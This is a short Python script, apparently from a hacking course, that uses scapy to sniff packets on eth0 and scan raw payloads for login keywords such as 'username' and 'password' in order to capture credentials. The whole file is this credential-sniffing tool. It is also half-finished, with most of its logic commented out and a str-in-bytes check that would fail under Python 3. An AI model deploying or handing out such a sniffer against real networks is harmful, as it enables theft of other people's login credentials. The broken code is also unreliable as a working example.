#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface = interface , store = False , prn = sniffed_packet)

def get_url(packet):
    #return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return None

def get_logon(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username" , "uname" , "login" , "password" , "pass" , "UserName" , "Password"]
            for keyword in keywords:
                if keyword in load:
            #print load
                     return load


def sniffed_packet(packet):
    #if packet.haslayer(http.HTTPRequest):
    print(packet.show())
        #url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    #url = get_url(packet)
        #print("[+] http request " + url)
        #if packet.haslayer(scapy.Raw):
            #load = packet[scapy.Raw].load
            #keywords = ["username" , "uname" , "login" , "password" , "pass" , "UserName" , "Password"]
            #for keyword in keywords:
                #if keyword in load:
                    #print load
                    #break
    logon = get_logon(packet)
        #if logon:
            #print("\n\n[+] username and password " + logon + "\n\n")

sniff("eth0")
